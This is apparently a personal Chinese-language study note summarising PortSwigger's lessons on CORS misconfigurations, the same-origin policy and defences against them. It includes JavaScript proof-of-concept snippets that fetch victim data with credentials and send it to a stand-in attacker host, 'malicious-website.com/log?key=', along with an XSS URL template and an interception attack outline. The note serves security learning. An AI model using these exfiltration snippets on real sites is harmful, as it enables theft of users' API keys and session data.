# 2023-05-23：筆記 PortSwigger 的 CORS.md

Ref:
- https://portswigger.net/web-security/cors
- https://portswigger.net/web-security/cors/same-origin-policy
- https://portswigger.net/web-security/cors/access-control-allow-origin

---------------



## 什麼是 CORS（跨源資源共享）？
CORS 是一種 browser 機制
- 可以控制對位於特定 domain 外的資源的訪問
- 它擴展並增加了 `same-origin policy` 的靈活性
- 然而，如 CORS config 不當，它也提供了跨 domain 攻擊的可能性
- CORS 不是對 cross-origin 攻擊的保護，如 cross-site request forgery（CSRF）(跨站請求偽造)


---------------

`same-origin policy` 是種限制性的 cross-origin 規範
- 它限制了網站與 domain 之外的資源的交互能力
- `same-origin policy` 是多年前為應對潛在的惡意 cross-domain 互動而定義的
  - 例如一個網站從另一個網站竊取私人資料。它通常允許一個 domain 向其他 domain 發出請求，但不能訪問 response

---------------

## 放寬 same-origin policy
`same-origin policy` 的限制性很強，因此，人們設計各種方法來規避這些限制
- 許多網站與 subdomain 或第三方的互動需要 full cross-origin access
- 用 CORS 可以有控制地放寬 `same-origin policy`


`cross-origin resource sharing protocol` 用 HTTP header 來定義 trusted web origins 和相關屬性
- 如是否允許認證訪問
- 這些內容在 browser 和它試圖訪問的 cross-origin 網站間的 header 交換中被結合起來。

---------------


## 由 CORS config 錯誤所引起的漏洞
許多網站使用 CORS 來允許從 subdomain 和受信任的第三方訪問
- 他們對 CORS 的實現可能包含錯誤或過於寬鬆，這可能導致可利用的漏洞



---------------


## Server 產生的 `ACAO` header 來自 client 指定的 `Origin` header
有些 Application 需要提供對其他 domain 的訪問
- 維護允許的 domain list 列表需要持續的努力
- 而且任何錯誤都有可能破壞功能

因此
- 一些 Application 採取簡單的方法，有效地允許來自任何其他 domain 的訪問

一種方法是通過從 request 中讀取 `Origin` header 並包括一個 responser header
- 說明 request 的來源是允許的
- 例如，考慮一個收到以下 request 的 Application

 
```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

然後它的 response 是

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...

```


這些 header 表示
- 允許從 request domain （`malicious-website.com`）訪問
- cross-origin requests 可以包括 cookies（`Access-Control-Allow-Credentials: true`），因此將在 session 中處理


由於 Application 在 `Access-Control-Allow-Origin` header 中反映了任意的來源
- 這意味著任何 domain 都可以訪問來自受攻擊 domain 的資源
- 如果 response 包含任何敏感資訊，如 API key or CSRF token，你可以通過在你的網站上放置以下 script 來 fetch 這些資訊

```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
  location='//malicious-website.com/log?key='+this.responseText;
};

```

---------------


## 錯誤的解析 `Origin` headers
一些支持從多個 origins 訪問的 Application 使用 whitelist 來實現這功能
- 當收到 CORS request 時，提供的 origin 與 whitelist 進行比較
- 如果該 origin 在白名單上，那麼它就會反映在 `Access-Control-Allow-Origin` header 中，這樣允許訪問
- 例如，Application 收到一個正常的 request，如：
 
```
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

Application 根據其允許的 origin 列表檢查所提供的 origin
- 如果它在列表中，則反映該 origin，如下所示：

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```


在實作 CORS origin whitelists 時，經常出現錯誤
- 一些組織決定允許從他們所有的 subdoamin（包括未來尚未存在的 subdomain）訪問
- 而一些 Application 允許從其他組織的 domain（包括他們的 subdomain）訪問
- 這些規則通常通過匹配 URL prefixes or suffixes，或使用正則表達式來實現
- 實作過程中的任何錯誤都可能導致對非預期的外部 domain 的訪問

例如，假設 Application 授予所有以 `normal-website.com` 結尾的 domain 訪問權
- 攻擊者可能通過註冊 `hackersnormal-website.com` domain 來獲得訪問權 

或者，假設 Application 允許以 `normal-website.com` 為 domain prefix 的網站訪問
- 攻擊者可能會使用 `normal-website.com.evil-user.net` domain 獲得訪問權 



---------------

## 白名單上的 `null` `origin` value
`Origin` header 支持 `null` 值。browser 可能會在各種不尋常的情況下在 `Origin` header 中發送 `null` 值：
- Cross-origin redirects.
- Requests from serialized data.
- Request using the `file:` protocol.
- Sandboxed cross-origin requests.


一些 Application 可能會把 `null` `origin` 列入白名單
- 以支持 Application 的本地開發
- 假設 Application 收到以 cross-origin request:
 
```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

而 server 的 response 是
 

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```



在這種情況下，攻擊者可以使用各種技巧來產生跨源請求(cross-origin request)
- 在 Origin header 中含有 `null` 的值。這將滿足 whitelist 的要求，從而實現 cross-domain access
- 例如，這可以通過使用 sandboxed 的 `iframe` 來 `cross-origin` request of the form


(這個範例看起來有點奇怪，感覺不需要混淆才對。應該可以正常關閉 iframe 的 tag 才對吧？)
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

---------------

## 通過 CORS 信任關係來挖掘 XSS
即使是正確的 CORS config 也會在兩個 origins 間建立信任關係
- 如果網站信任一個容易受到跨站腳本攻擊(XSS)的來源，攻擊者可以利用 XSS inject 一些 JavaScript，使 CORS 從信任易受攻擊的 Application 的網站搜尋敏感資料


給出以下 request：


```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

如果 server 的 respnse 是
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Then an attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like:

然後一個攻擊者在 `subdomain.vulnerable-website.com` 上發現了 XSS 漏洞
- 就可以利用這個漏洞來獲取 API key，使用的 URL 如下：

```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

---------------


## 不良的 CORS config 破壞 TLS
假設一個 HTTPS 的 Application 將一個使用 HTTP 的可信 subdomain 列入白名單
- 當 Application 收到以下 request 時：


```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

Application 的 response 是：


```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```



在這種情況下，能夠攔截受害者用戶流量的攻擊者可以利用 CORS config 來破壞受害者與 Application 的互動
- 這攻擊包括以下步驟：
    1. 受害者發出任何普通的 HTTP request
    2. 攻擊者 inject 一個 redirection 到: `http://trusted-subdomain.vulnerable-website.com`
    3. 受害者的 browser 跟隨 redirection
    4. 攻擊者攔截普通 HTTP request，並返回一個包含 CORS request 的欺騙性 response: `https://vulnerable-website.com`
    5. 受害者的 browser 發出 CORS 請求，包括 origin: `http://trusted-subdomain.vulnerable-website.com`
    6. Application 允許該 request，因為這是一個 whitelist 的 origin。request 的敏感資料會在 response 中傳回
    7. 攻擊者的欺騙頁面可以讀取敏感資料並將其傳輸到攻擊者控制的任何 domain


這攻擊是可行的
- 即使受攻擊的網站在使用 HTTPS，沒有任何 HTTP endpoints，所有 cookies 都被標記為 `secure` 也一樣


---------------


## 內部網路和無憑證的 CORS
大多數 CORS 攻擊依賴於 response 有下面這 header


```
Access-Control-Allow-Credentials: true
```

如果沒有這個 header
- 受害者的 browser 將拒絕發送他們的 cookie
- 這意味著攻擊者只能獲得未經認證的內容，而他們直接瀏覽目標網站也能輕易獲得這些內容


然而，有種常見的情況是
- 攻擊者不能直接訪問一個網站
- 當它是組織的內部網路的一部分，並且位於私人 IP 內
- 內部網站的安全標準往往低於外部網站，使攻擊者能夠找到漏洞並獲得進一步訪問


例如，私人網路內的 cross-origin request 可能是這樣的
```
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```

server 的 response 是


```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```


Application server 信任來自任何沒有證書的 origin 的資源請求
- 如果私人 IP 內的 user 訪問外部網路，那麼可以從使用受害者 browser 作為 proxy 內部網路的外部站點進行基於 CORS 的攻擊


---------------

## 如何避免 CORS 的攻擊
CORS 漏洞的出現主要是由於錯誤的 config
- 因此，預防是一個 config 問題
- 下面描述一些針對 CORS 攻擊的有效防禦措施


---------------

## 正確 config cross-origin requests
如果網路資源包含敏感資訊
- 就應該在 `Access-Control-Allow-Origin` header 中正確指定來源(origin)


---------------


## 只允許信任的網站
在 `Access-Control-Allow-Origin` header 指定的來源應該只是受信任的網站
- 特別是，在沒有驗證的情況下
- 動態反映 cross-origin requests 的 origins 是很容易被利用的，要避免


---------------

 
## 避免白名單設定 `null`
避免使用 `Access-Control-Allow-Origin: null`
- 來自內部文件和 sandboxed request 的 cross-origin resource 可以指定 `null`
- CORS header 應該在 private and public server 的可信來源方面進行適當定義

---------------

## 內部網路中避免使用 wildcards (`*`)
避免在內部網路中使用 wildcards
- 當內部 browser 可以訪問不受信任的外部 domain 時，僅僅相信網路配置來保護內部資源是不夠的

---------------

## CORS 不能替代 server side 的安全策略
- CORS 定義了 browser 的行為，永遠不能替代 server side 對敏感資料的保護
- 攻擊者可以直接偽造來自任何可信來源的 request
- 因此，server 應該繼續對敏感資料進行保護，如 authentication 和 session management

---------------

## 什麼是 same-origin policy ?
`same-origin policy` 是種網路 browser 的安全機制，目的是防止網站之間相互攻擊
- `same-origin policy` 限制一個 domain 的 script 訪問另一個 domain 的資料
- 一個 origin 由 URI scheme、domain 和 port 組成

考慮下面的 URL：
- scheme 是 `http`
- domain 是`normal-website.com`
- port 是`80`
```
http://normal-website.com/example/example.html
```


下表顯示如果上述 URL 的內容試圖訪問其他來 origins，將如何應用 `same-origin policy`:

| URL accessed | Access permitted? |
| :--- | :--- |
| http://normal-website.com/example/ | Yes: same scheme, domain, and port |
| http://normal-website.com/example2/ | Yes: same scheme, domain, and port |
| https://normal-website.com/example/ | No: different scheme and port |
| http://en.normal-website.com/example/ | No: different domain |
| http://www.normal-website.com/example/ | No: different domain |
| http://normal-website.com:8080/example/ | No: different port* |


(*Internet Explorer 將允許這種訪問，因為 IE 在應用 same-origin policy 沒有考慮到 port)

---------------


## 為什麼需要 same-origin policy？
當 browser 從一個 origin 向另一個 origin 發送 HTTP request時
- 與另一個 domain 相關的任何 cookie（包括 authentication session cookie）也作為 request 的一部分發送
- 這意味著 response 將在 user's session 中產生，並包含特定於 user 的任何相關資料
- 如果沒有 same-origin policy，如果你訪問了惡意網站，它就可以從 GMail 中讀取你的電子郵件，從 Facebook 中讀取私人訊息等

---------------

## `same-origin policy` 是如何實現的？
`same-origin policy` 通常控制 JavaScript code 對 fetch cross-domain 的 content 的訪問
- 通常允許頁面資源的  Cross-origin loading
- 例如，SOP 允許通過 `<img>` embedding image，`<video>` embedding media，以及 `<script>` embedding JavaScript
- 但是，雖然頁面可以載入這些外部資源，但頁面上的任何 JavaScript 都無法讀取這些資源的內容


`same-origin policy` 有多種例外情況：
- 有些對象是 writable but not readable cross-domain，如 `iframe` 或 `new windows` 的 `location` 對像或 `location.href` 屬性
- 有些對像是 readable but not writable cross-domain，如 `window` 的 `length` 屬性(which stores the number of frames being used on the page)和 `closed` 屬性。
- `replace` function 一般可以在 cross-domain 的 `location` 上呼叫
- 可以 cross-domain 呼叫某些 function。如， `new windows` 上呼叫 function `close`、`blur` 和 `focus`
  - `postMessage` 也可以在 `iframe` 和 `new windows` 上呼叫，以便將 message 發送到另一個 domain

由於一些 legacy requirements，`same-origin policy` 在處理 cookie 時更加寬鬆
- 因此它們通常可以從站點的所有 subdomain 訪問，即使每個 subdomain 在技術上都是不同的來 origin
- 可以使用 `HttpOnly` cookie 減輕這種風險

可以使用 `document.domain` 放寬 `same-origin policy`
- 此特殊屬性允許放寬特定 domain 的 SOP
- 但前提是它是你的 FQDN (fully qualified domain name) 的一部分
- 例如，你有一個 domain `marketing.example.com`，你希望在 `example.com` 上 read 該 domain 的內容
  - 為此，兩個 domain 都要將 `document.domain` 設為 `example.com`
  - 然後 SOP 將允許兩個 domain 之間的訪問，儘管它們的 origin 不同
  - (在過去，可以將 `document.domain` 設定為一個 TLD，如 `com`，它允許在同一 TLD 上的任何 domain 之間進行訪問，但modern browsers 已經不能這樣做了)




---------------

## 什麼是 `Access-Control-Allow-Origin` response header?
- `Access-Control-Allow-Origin` header 包含在一個網站對來自另一個網站的 request 的 response 中
- 並識別 request 的允許 origin
- browser 將 `Access-Control-Allow-Origin` 與 request 網站的來 origin 進行比較，如果兩者相符，則允許訪問該 response

---------------




## 實作簡單的 cross-origin resource sharing (CORS)
CORS 規定了 web server 和 browser 之間交換的 header 內容
- 限制了 origin domain 之外的網路資源 request 的 origin
- CORS 規範確定了一個 protocol headers 的集合，其中 `Access-Control-Allow-Origin` 是最重要的
- 當網站 cross-domain request 資源時，server 會返回這個 header，browser 會加上 `Origin` header

例如，假設一個 origin 為 `normal-website.com` 的網站發起以下 cross-domain request:

```
GET /data HTTP/1.1
Host: robust-website.com
Origin : https://normal-website.com
```

`robust-website.com` 的 server 返回以下 response：


```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
```

browser 將允許運行在 `normal-website.com` 上的 code 訪問該 response，因為 origins 匹配  

`Access-Control-Allow-Origin` 的規範允許多個 origins，或 `null` 值，或 `wildcard *`
- 然而，沒有 browser 支持多個 origins，而且對使用 `wildcard *` 也有限制


---------------

## 處理帶有證書的 cross-origin resource requests
cross-origin resource requests 的 default 行為是在不包含 cookie 和 Authorization header 等 credentials 的情況下傳遞 request
- 但，cross-domain server 可以設定 CORS 的 `Access-Control-Allow-Credentials` header 來允許讀取 response
- 現在，如果 request 的網站使用 JavaScript 來聲明它與 request 一起發送 cookies

```
GET /data HTTP/1.1
Host: robust-website.com
...
Origin: https://normal-website.com
Cookie: JSESSIONID=<value>
```

response 為:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Credentials: true
```

那麼 browser 將允許請求網站讀取 response
- 因為 `Access-Control-Allow-Credentials` response header 為 `true`
- 否則，browser 將不允許訪問該 response

---------------

 
## 用 wildcards 放寬 CORS

`Access-Control-Allow-Origin` header 支援 wildcards
- 注意，wildcards 不能在任何其他值中使用。如，這樣的 header 是無效的：
  - `Access-Control-Allow-Origin: https://*.normal-website.com`

wildcards header
```
Access-Control-Allow-Origin: *
```


幸運的是，從安全角度來看
- wildcard 的使用受到限制
- 因為你不能將 wildcard 與 credentials（authentication, cookies or client-side certificates）結合起來

因此，一個 的 cross-domain server response 的形式是：
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**這是不允許的，因為這非常危險**
- 會把目標網站上任何經過認證的內容暴露給所有人

鑑於這些限制，一些網路 server 根據客戶指定的 origin，動態地設定 `Access-Control-Allow-Origin` header 資訊
- 這是對 CORS 限制的一種變通方法，並不安全
- 其他章節有討論這點 [how this can be exploited](https://portswigger.net/web-security/cors#server-generated-acao-header-from-client-specified-origin-header)



---------------

## 檢查 Pre-flight
`pre-flight check` 被加到 CORS 規範中，以保護傳統資源免受 CORS 允許的 expanded request 選項的影響
- 某些情況下，當 cross-domain request 包括非標準的 HTTP method 或 header 資訊時，cross-origin request 之前會使用 `OPTIONS` method 的 request，`CORS` protocol 有必要在允許 cross-origin request 之前對哪些 method 和 header 資訊是允許的進行初始檢查
- 這被稱為 `pre-flight check`
  - server 會返回允許 method 列表
  - 除了可信的來源之外， browser 會檢查 request 網站的 method 是否被允許

例如
- 這是個尋求使用 `PUT` 的 `pre-flight check`
- 同時還有個名為 `Special-Request-Header` 的自定義 request header

```
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```

server 可能會 response:
```
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```


這 response 規定了
- 允許的 method （`PUT`, `POST`, `OPTIONS`）和
- 允許的 request header（`Special-Request-Header`）
- 在這種特殊情況下，cross-domain server 也允許發送證書
  - `Access-Control-Max-Age` header 定義了 maximum timeframe，用於 cache pre-flight 的 response，以便重複使用
  - 如果 request method 和 header 資訊是允許的，那麼 browser 就會以通常的方式處理 cross-domain request
- `pre-flight check` 會給 cross-domain request 增加一個額外的 HTTP request 往返，所以會增加瀏覽的開銷

---------------


## CORS 是否能防止 CSRF？
- CORS 無法防禦對跨站請求偽造(CSRF)攻擊，這是常見的誤解
- CORS 是對 same-origin policy 的控制性放鬆
  - 配置不好的 CORS 實際上可能會增加 CSRF 攻擊的可能性或加劇其影響
- 有各種方法可以在不使用 CORS 的情況下進行 CSRF 攻擊，包括簡單的 HTML form 表單和 cross-domain resource